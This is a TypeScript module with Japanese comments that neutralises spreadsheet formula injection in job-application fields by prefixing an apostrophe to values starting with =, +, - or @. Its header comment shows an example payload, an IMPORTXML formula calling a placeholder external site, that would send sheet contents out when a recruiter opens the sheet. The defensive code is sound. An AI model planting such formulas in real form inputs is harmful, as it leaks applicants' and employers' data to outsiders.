/**
 * 応募内容をスプレッドシートに渡す前の無害化。
 *
 * スプレッドシートは `=` や `+` で始まるセルを数式として実行する。
 * 応募者が氏名欄に `=IMPORTXML("http://外部サイト", ...)` と入れておくと、
 * 採用担当がシートを開いた瞬間にそれが動き、シートの内容を外部へ送れてしまう。
 * 先頭にアポストロフィを付けると、スプレッドシートは常に文字列として扱う。
 */

export interface Application {
  inquiryType: string;
  recruitmentType: string;
  jobs: string[];
  name: string;
  furigana: string;
  email: string;
  phone: string;
  portfolioUrl: string;
  message: string;
  resumeUrl: string;
  resumeName: string;
  careerHistoryUrl: string;
  careerHistoryName: string;
  portfolioFileUrl: string;
  portfolioFileName: string;
}

// 先頭の空白類を読み飛ばした最初の文字が数式の開始に使えるかを見る。
// 空白で始めれば検査をすり抜けられる、という抜け道を塞ぐため。
const FORMULA_START = /^[\s]*[=+\-@]/;

export function escapeSheetValue(value: string): string {
  if (!value) return "";
  return FORMULA_START.test(value) ? `'${value}` : value;
}

export function toSafeApplication(data: Application): Application {
  return {
    inquiryType: escapeSheetValue(data.inquiryType),
    recruitmentType: escapeSheetValue(data.recruitmentType),
    jobs: data.jobs.map(escapeSheetValue),
    name: escapeSheetValue(data.name),
    furigana: escapeSheetValue(data.furigana),
    email: escapeSheetValue(data.email),
    phone: escapeSheetValue(data.phone),
    portfolioUrl: escapeSheetValue(data.portfolioUrl),
    message: escapeSheetValue(data.message),
    // URLは自前のアップロード経路が作った値だが、万一に備えて同じ扱いにする
    resumeUrl: escapeSheetValue(data.resumeUrl),
    resumeName: escapeSheetValue(data.resumeName),
    careerHistoryUrl: escapeSheetValue(data.careerHistoryUrl),
    careerHistoryName: escapeSheetValue(data.careerHistoryName),
    portfolioFileUrl: escapeSheetValue(data.portfolioFileUrl),
    portfolioFileName: escapeSheetValue(data.portfolioFileName),
  };
}
